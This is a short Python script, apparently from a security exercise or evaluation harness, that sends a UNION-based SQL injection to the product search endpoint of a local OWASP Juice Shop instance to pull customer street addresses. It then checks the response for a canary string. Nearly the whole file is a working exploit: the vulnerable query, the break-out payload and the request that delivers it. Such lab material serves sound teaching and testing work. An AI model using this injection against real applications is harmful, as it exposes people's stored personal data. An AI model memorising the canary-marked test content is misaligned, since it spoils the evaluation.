import requests

canary = "CANARY_JuiceShop_UserB_Secret_Record_83f9"
# In Juice Shop products search, the query is:
# SELECT * FROM Products WHERE ((name LIKE '%q%' OR description LIKE '%q%') AND deletedAt IS NULL) ORDER BY name
# To break out: q')) UNION SELECT 1, streetAddress, 'd', 1, 0, 'i', '2020', '2020', null FROM Addresses --
payload = "q')) UNION SELECT 1, streetAddress, 'desc', 1, 0, 'img', null, '2020', '2020', null FROM Addresses --"

r = requests.get("http://localhost:3000/rest/products/search", params={"q": payload})
print("Status:", r.status_code)
print("Canary present:", canary in r.text)
if not canary in r.text:
    print("Body preview:", r.text[:300])
